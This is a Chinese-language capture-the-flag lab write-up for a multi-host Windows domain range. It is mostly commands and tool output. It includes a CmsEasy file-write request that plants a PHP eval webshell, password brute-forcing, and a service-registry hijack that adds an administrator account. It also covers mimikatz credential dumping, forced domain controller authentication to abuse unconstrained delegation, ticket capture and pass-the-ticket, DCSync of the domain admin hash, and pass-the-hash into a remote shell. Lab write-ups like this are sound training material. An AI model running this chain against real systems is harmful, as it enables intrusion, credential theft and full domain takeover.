
# 外网

依旧是fscan开路，不过要注意靶机会封ip，fscan默认会暴力破解的

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 39.99.146.141

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.146.141:80 open
39.99.146.141:22 open
39.99.146.141:21 open
39.99.146.141:3306 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.99.146.141      code:200 len:68108  title:中文网页标题
```

这里可以先尝试ftp匿名登陆，但是实际登不上去，这个版本的vsftpd有漏洞但是只是瘫痪服务

web弱密码admin/123456能上去

在登陆前首页扒拉到`CmsEasy 7_7_5_20210919_UTF8`，看着像是7.7.5版本，这个版本确实有个poc
https://note-hxlab.wetolink.com/share/msJH69Y06ZlS
但是实际测试有问题，马写不进去，而且有过滤，这个poc可以
[CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)

```bash
POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1
Host: 39.99.146.141
Content-Length: 85
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: PHPSESSID=77a1ggekksec3shvure3e5gl2k; loginfalse74c6352c5a281ec5947783b8a186e225=1; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Upgrade-Insecure-Requests: 1
Priority: u=0, i

sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<%3fphp+%40eval($_GET[1])%3b%3f>

```
直接写马即可，这种小众的cms漏洞poc真的难找，接着上线下vshell就行


flag只有root可读
```bash
www-data@localhost:/home/flag$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Sep 13 09:19 .
drwxr-xr-x 3 root root 4096 Jun 22  2022 ..
-r-------- 1 root root  798 Sep 13 09:19 flag01.txt
```

s位，不过实际上云镜的linux都直接copy-fail一把梭就拿下了

```bash
www-data@localhost:/home/flag$ find / -perm -4000 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
www-data@localhost:/home/flag$ diff --line-format=%L /dev/null flag01.txt
  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
 |  _"\ \| ___"|/ |"|    \| ___"|/U /"___|uU  /"\  u  |_ " _|     ___     \/"_ \/ | \ |"|    
/| | | | |  _|" U | | u   |  _|"  \| |  _ / \/ _ \/     | |      |_"_|    | | | |<|  \| |>   
U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
 |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
  |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
 (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/  

flag01: flag{8df5a1f4-1238-43ea-a3c8-f4be66bb2c6a}

Great job!!!!!!

Here is the hint: WIN19\Adrian

I'll do whatever I can to rock you...
www-data@localhost:/home/flag$
 
```

# 内网

flag1 hint了WIN19\Adrian这个账户，外网这台有数据库找一下密码练上去可以查查其实，可能有密码复用，但是这里没有

fscan的时候最好还是不要排除外网主机了，不然它不扫poc和爆破，这版本有点小毛病

```
root@localhost:~# fscan -h 172.22.4.36/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.4.36     is alive
(icmp) Target 172.22.4.7      is alive
(icmp) Target 172.22.4.19     is alive
(icmp) Target 172.22.4.45     is alive
[*] Icmp alive hosts len is: 4
172.22.4.45:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.36:80 open
172.22.4.7:88 open
172.22.4.36:3306 open
172.22.4.45:445 open
172.22.4.19:445 open
172.22.4.7:445 open
172.22.4.45:139 open
172.22.4.19:139 open
172.22.4.7:139 open
172.22.4.19:135 open
172.22.4.45:135 open
172.22.4.7:135 open
[*] alive ports len is: 15
start vulscan
[*] NetInfo
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetInfo
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetBios 172.22.4.45     XIAORANG\WIN19
[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
```

|IP|主机名|FQDN / NetBIOS|系统信息|角色判断|开放端口|
|---|---|---|---|---|---|
|172.22.4.7|DC01|DC01.xiaorang.lab / DC:DC01|Windows Server 2016 Datacenter 14393|域控 DC|88, 135, 139, 445|
|172.22.4.19|FILESERVER|FILESERVER.xiaorang.lab|Windows Server 2016 Standard 14393|文件服务器|135, 139, 445|
|172.22.4.45|WIN19|XIAORANG\WIN19|未明确显示系统版本|成员服务器 / IIS Web|80, 135, 139, 445|

# WIN19

根据hint接下来要打WIN19了，爆破密码就行

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt --local-auth
```
能得到密码是babygirl1，过期的连上需要改

桌面上有PrivescCheck，这是个windows提权枚举工具，里面也有检测结果，在PrivescCheck_WIN19.html

```
Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : BUILTIN\Users
Permissions       : WriteDAC, ..., SetValue, CreateSubKey, ...
Status            : Stopped
UserCanStart      : True
UserCanStop       : True
```
**含义**：`BUILTIN\Users`（Adrian 属于这个组）对 `gupdate` 服务的注册表键有 **SetValue / CreateSubKey / WriteDAC** 权限，而该服务以 **LocalSystem** 运行，并且 **当前用户能启动它**。

把 `ImagePath` 改成我们的恶意程序，再启动服务，就能以 **SYSTEM** 权限执行代码，明显感觉又有点像”放大镜“了，怎么win都是这样提权的，不过这里弹窗口弹不出来的不在一个session

```powershell
C:\Users\Adrian>reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user mj 123.com /add && net localgroup administrators mj /add" /f
操作成功完成。

C:\Users\Adrian>sc start gupdate
[SC] StartService 失败 1053:

服务没有及时响应启动或控制请求。


C:\Users\Adrian>net user

\\WIN19 的用户帐户

-------------------------------------------------------------------------------
Administrator            Adrian                   DefaultAccount
Guest                    mj                       WDAGUtilityAccount
命令成功完成。
```
可以看到已经有了，连上去即可，上去扒拉文件的时候看到admin下有个finalshell，但是里面没有凭据


mimikatz抓hash吧

```
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::cache" "exit" > 1.txt


	 * Username : WIN19$
	 * Domain   : XIAORANG
	 * NTLM     : 4069b921a2a0478e2cb885eb1a067a7c
	 * SHA1     : 256e9abe3555b675f11a3d9be3b15abfdb51949c
```
有机器账户的hash其他都没什么大作用


# 域

利用非约束性委派攻击域控，核心逻辑是**控制一台开启了非约束性委派的机器，并强制域控主动向该机器发起 Kerberos 认证，从而捕获域控的 TGT（票据授予票据）**。拿到域控 TGT 后，即可通过 Pass-the-Ticket 执行 DCSync，最终完全控制域环境

（注意这边强制域控发送kerberos的时候用机器名，这样能确保走Kerberos协议）


```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc findDelegation.py xiaorang.lab/'WIN19$' -hashes :4069b921a2a0478e2cb885eb1a067a7c -dc-ip 172.22.4.7 
AccountName  AccountType  DelegationType  DelegationRightsTo
-----------  -----------  --------------  ------------------
WIN19$       Computer     Unconstrained   N/A
```
可以看到WIN19$这个机器账户有非约束性委派，接下来进攻思路就很明显了，虽然我不知道命令但是我知道思路，笑崩

这里我用了好几个工具都不成功，最后用dfscoerce

```
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc dfscoerce.py -u WIN19$ -hashes :4069b921a2a0478e2cb885eb1a067a7c -d xiaorang.lab WIN19 172.22.4.7
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[-] Connecting to ncacn_np:172.22.4.7[\PIPE\netdfs]
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:445  ...  OK
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!
NetrDfsRemoveStdRoot
ServerName:                      'WIN19\x00'
RootShare:                       'test\x00'
ApiFlags:                        1


DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.

C:\>Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 1 seconds for new TGTs


[*] 2026/9/13 2:27:47 UTC - Found new TGT:

  User                  :  DC01$@XIAORANG.LAB
  StartTime             :  2026/9/13 9:20:57
  EndTime               :  2026/9/13 19:20:57
  RenewTill             :  2026/9/20 9:20:57
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4a/ToE8YLfD1AsbCx29nKDParao9ZvJ6hUaWEcaFV5WZXQmSvYAW52RcgkflhTxPs1Z1nXfj04JvSRGz/RBu0U+nsfVfafbmDShEKDmo8wClDceq9wOb7MoWvM7CswYDamwO0dJy4dh7xXHUfbpFWOiLmlPTl3jpIoq1hdBfnlrkycC504IwbklwirU2txnRq4nSl2+wrSPmLdJ8DPS8ixsKbqqTX/MGmxDUpvBjB6V4wrSNWtHrbesbO2Ts2TYm42obCZHjqjfjlBvvqYIvDtWUXaVhEHLJki5TcYURwYEgJotpSHiYypcay/lNkqJFUI1+Q3YJCIWW9ixAukbZn2+pSiTi6ppYKKbK+O1M4+b14O7gT3hK0o2uqaDU/ZR13u6zMVyvT9i6Lt29rnZDWQ3Io3Ho1EkjsGbhGfg+32muKfepzDigYT4keo7PSdBpDXTPBNPDwB/b42pVCgaRIIzWEEtTGTGyFdIVROWZe9xx1T5gC7dF/6+NJAjaqTF85HYvR2nk5TyPxvyUhMGm7v0INo/6QdZX4LUlqmGcnTVv/NgBxqGKHn7ycM11SCPhtClUHjc2GgBGGBivwpK5lk6u8cInfqrbBLZUYiApn+8xEwua/fGFkoBbTxvwuDWxazbXQutS9RsRBiTfK2g/UZQKoWbS3tFr2CzNh5M2kL2gWjX+Sa2N3d9tB/+aP6WFFNjDQHXfyvii5qd0Aml+915uigVSho5FjNrhOdMfB4MHXVx/6Vj8H+xmL/2pyhcXi+IWytt//io38tYuFr2HGMLdXF/2nUd48bFcloCO8jJJhYLr6J4eEk8AtDfPD4vVvglxYGShJCri1MsYN5i+Yow4K74hrvkFxj2Vm4EADECs6Ft+c6+qp5PaophQENEmKpJu/hjWmk4iZK9w4VLUtSXBlN1S/LaKlx11vEWSsHDx26sfONhGvmY3BdtXeFhkMyqUQPWj1iod4kwfSvNLXxpqN0zTEdVltgLGfOG+wZIV1enEg2H/7EudpRVVINoN23//euCq0ppwSpKyXUrzZzHCdkRqW3omUlLp7bCteaUMAUP5xbJoX+LP2tx78G/L54ZuowEXa2ECs13GLhIsBjOwsZepbaF/t/SmFBZjL99aYyTa1m9AWgt7uPS/MzZ9z2GeA2XoetDCCuyRKR/OvoNYVefbxfPaCPVP90DsuXBYVxaJsgpnfK4smypDQUsJg7sHvddFu10vaBzpBHVJSIWZSLL1r3RJWPBnlDwqpssyf3GxSoCM+meav0ADizu753fH599mfVIYMRQaSa9z7dJt09jnh2Jt9KGxBfQTvr5W4JAdvZAT0qFr243h1njSkv77BsQosYbSPqk8xo4/iV3eA8yyOeO2aj0DuolWw9xBExsyPatdMfcCszlI1IPeeEOlcvGQYTBKZceEJWIl10haMeduwwYE5SPNPBnUKjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA9iZBRt9ysxVuFBQnI7EcdlEcYKym7iH0hbqlUNUuDx6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDkxMzAxMjA1N1qmERgPMjAyNjA5MTMxMTIwNTdapxEYDzIwMjYwOTIwMDEyMDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==

[*] Ticket cache size: 1

```

抓到票据之后用rubeus导入

```
C:\>Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4a/ToE8YLfD1AsbCx29nKDParao9ZvJ6hUaWEcaFV5WZXQmSvYAW52RcgkflhTxPs1Z1nXfj04JvSRGz/RBu0U+nsfVfafbmDShEKDmo8wClDceq9wOb7MoWvM7CswYDamwO0dJy4dh7xXHUfbpFWOiLmlPTl3jpIoq1hdBfnlrkycC504IwbklwirU2txnRq4nSl2+wrSPmLdJ8DPS8ixsKbqqTX/MGmxDUpvBjB6V4wrSNWtHrbesbO2Ts2TYm42obCZHjqjfjlBvvqYIvDtWUXaVhEHLJki5TcYURwYEgJotpSHiYypcay/lNkqJFUI1+Q3YJCIWW9ixAukbZn2+pSiTi6ppYKKbK+O1M4+b14O7gT3hK0o2uqaDU/ZR13u6zMVyvT9i6Lt29rnZDWQ3Io3Ho1EkjsGbhGfg+32muKfepzDigYT4keo7PSdBpDXTPBNPDwB/b42pVCgaRIIzWEEtTGTGyFdIVROWZe9xx1T5gC7dF/6+NJAjaqTF85HYvR2nk5TyPxvyUhMGm7v0INo/6QdZX4LUlqmGcnTVv/NgBxqGKHn7ycM11SCPhtClUHjc2GgBGGBivwpK5lk6u8cInfqrbBLZUYiApn+8xEwua/fGFkoBbTxvwuDWxazbXQutS9RsRBiTfK2g/UZQKoWbS3tFr2CzNh5M2kL2gWjX+Sa2N3d9tB/+aP6WFFNjDQHXfyvii5qd0Aml+915uigVSho5FjNrhOdMfB4MHXVx/6Vj8H+xmL/2pyhcXi+IWytt//io38tYuFr2HGMLdXF/2nUd48bFcloCO8jJJhYLr6J4eEk8AtDfPD4vVvglxYGShJCri1MsYN5i+Yow4K74hrvkFxj2Vm4EADECs6Ft+c6+qp5PaophQENEmKpJu/hjWmk4iZK9w4VLUtSXBlN1S/LaKlx11vEWSsHDx26sfONhGvmY3BdtXeFhkMyqUQPWj1iod4kwfSvNLXxpqN0zTEdVltgLGfOG+wZIV1enEg2H/7EudpRVVINoN23//euCq0ppwSpKyXUrzZzHCdkRqW3omUlLp7bCteaUMAUP5xbJoX+LP2tx78G/L54ZuowEXa2ECs13GLhIsBjOwsZepbaF/t/SmFBZjL99aYyTa1m9AWgt7uPS/MzZ9z2GeA2XoetDCCuyRKR/OvoNYVefbxfPaCPVP90DsuXBYVxaJsgpnfK4smypDQUsJg7sHvddFu10vaBzpBHVJSIWZSLL1r3RJWPBnlDwqpssyf3GxSoCM+meav0ADizu753fH599mfVIYMRQaSa9z7dJt09jnh2Jt9KGxBfQTvr5W4JAdvZAT0qFr243h1njSkv77BsQosYbSPqk8xo4/iV3eA8yyOeO2aj0DuolWw9xBExsyPatdMfcCszlI1IPeeEOlcvGQYTBKZceEJWIl10haMeduwwYE5SPNPBnUKjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCA9iZBRt9ysxVuFBQnI7EcdlEcYKym7iH0hbqlUNUuDx6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDkxMzAxMjA1N1qmERgPMjAyNjA5MTMxMTIwNTdapxEYDzIwMjYwOTIwMDEyMDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
```

然后mimikatz直接抓域管hash就行了

```
mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /user:xiaorang\Administrator
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] 'xiaorang\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 1601/1/1 8:00:00
Password last change : 2026/9/13 9:20:52
Object Security ID   : S-1-5-21-1913786442-1328635469-1954894845-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 4889f6553239ace1f7c47fa2c619c252
```

拿到域管hash了后面pth横向就行了

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc impacket-wmiexec -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang.lab/administrator@172.22.4.7
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:135  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.4.7:49666  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
xiaorang\administrator
```


